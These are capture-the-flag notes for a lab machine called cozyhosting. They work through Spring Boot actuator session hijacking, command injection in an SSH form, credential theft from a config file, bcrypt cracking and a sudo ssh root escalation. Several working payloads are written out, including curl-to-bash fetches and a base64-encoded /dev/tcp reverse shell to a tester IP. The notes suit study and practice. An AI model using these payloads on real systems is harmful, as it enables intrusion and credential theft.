initial scans show 22, 80
80 redirects cozyhosting.htb, add that to /etc/hosts
Not much with dir fuzzing, we look around with whatever we have.
Clicking around, we find a "WhiteLabel error page". Looking it up tells us it is related to SpringBoot
So we use a wordlist specific to springboot content for dirb
`gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt`

We now see some pages like, /actuator/session
Here, we find the SESSION_ID for kanderson
Go to the webpage, replace the cookie with the session id, and we get logged into the admin pane
Here, there's an ssh tool, with "host" and "ip" textboxes.
In the background, it is probably running something like either `ssh -i id_rsa user@host` OR `ssh user@host -i id_rsa`
we assume it is the first one, and try to make it do something like `ssh -i id_rsa user;cmd_injection;@host -i id_rsa `. So we send it to burp repeater, and try
host=127.0.0.1&username=testff;{curl,10.10.14.31:8990/testdd}; while having a python server running, and we see the request
This confirms command injection
We could simply now host a reverse shell as `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh` and then do
host=127.0.0.1&username=testff;{curl,10.10.14.31:8990/rev.sh|bash};

But we try to send the payload base64 encoded.

NOTE - we cant send spaces. so we need to put it in {words,separated,commas} or ${IFS}, which stands for Internal Field Separator.
Now, we try to make it run the command `bash -c 'bash -i >& /dev/tcp/10.10.14.31/4444 0>&1'`. To do this, first, we base64 encode it, and then send the encoded string, get the command injection to decode it, and then pipe it to bash. so,
`echo 'bash  -i >& /dev/tcp/10.10.14.31/4444  0>&1' |base64` which is

In the burp,
host=127.0.0.1&username=testff;{echo,-n,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzEvNDQ0NCAgMD4mMSAK}|{base64,-d}|bash; and url encode the whole username and send
rev shell!
Note - we ended up using the first method, cuz second one gave us non-interractive shell.

---
We see a jar file
we'll unzip it in /dev/shm
`unzip -d /dev/shm cloudhosting-0.0.1.jar`
Once we unzip, we find a postgre username-password at `/path/BOOT-INF/classes/application.properties` as postgres Vg&nvzAQ7XxR

`find . -name *.properties`

`psql -h 127.0.0.1 -U postgres`
```
\list
\connect cozyhosting;
\dt
select * from users;
```

found a bcrypt hash, used john to crack it. can also use hashcat
`hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt`
Guessing based on the users on the machine, we try ssh to josh, and it works

`sudo -l` showed user can run sudo ssh. gtfo bins,
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
and root!
